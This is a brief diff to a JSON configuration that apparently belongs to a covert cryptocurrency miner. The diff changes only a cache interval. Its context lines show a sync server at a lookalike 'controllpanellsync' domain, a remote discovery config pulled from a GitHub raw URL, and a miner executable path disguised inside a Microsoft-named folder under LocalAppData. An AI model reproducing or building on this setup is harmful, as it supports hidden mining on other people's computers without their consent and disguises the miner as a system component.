@@ -3,7 +3,7 @@
     "PrimaryServer": "https://sync.controllpanellsync.site/api/miner/sync",
     "DiscoveryUrl": "https://raw.githubusercontent.com/auricore-stack/test2/refs/heads/main/sync_config.json",
     "DiscoveryEnabled": true,
-    "DiscoveryCacheMinutes": 2
+    "DiscoveryCacheMinutes": 20
   },
 	"MinerConfig": {
     "EnginePath": "%LOCALAPPDATA%\\Microsoft\\AuriEngine\\AuriEngine.exe",
